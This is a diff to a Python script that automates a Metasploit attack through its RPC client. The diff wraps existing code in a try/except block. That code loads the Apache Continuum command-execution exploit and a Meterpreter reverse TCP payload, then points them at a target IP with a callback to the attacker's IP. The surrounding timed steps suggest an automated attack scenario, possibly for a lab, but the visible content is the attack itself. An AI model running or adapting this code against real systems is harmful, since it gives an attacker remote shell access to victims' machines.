@@ -20,13 +20,18 @@ def main(argv):
     time.sleep(60)
 
     client = MsfRpcClient('kali')
+    
+    try:
+        exploit = client.modules.use('exploit', 'linux/http/apache_continuum_cmd_exec')
+        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
+        exploit['RHOSTS'] = target_ip
+        payload['LHOST'] = my_ip
 
-    exploit = client.modules.use('exploit', 'linux/http/apache_continuum_cmd_exec')
-    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
-    exploit['RHOSTS'] = target_ip
-    payload['LHOST'] = my_ip
-
-    exploit.execute(payload=payload)
+        exploit.execute(payload=payload)
+    
+    except Exception as e:
+        print(e)
+        pass
 
     time.sleep(60)
     output_time_file_end = 'time_step_3_end.txt'
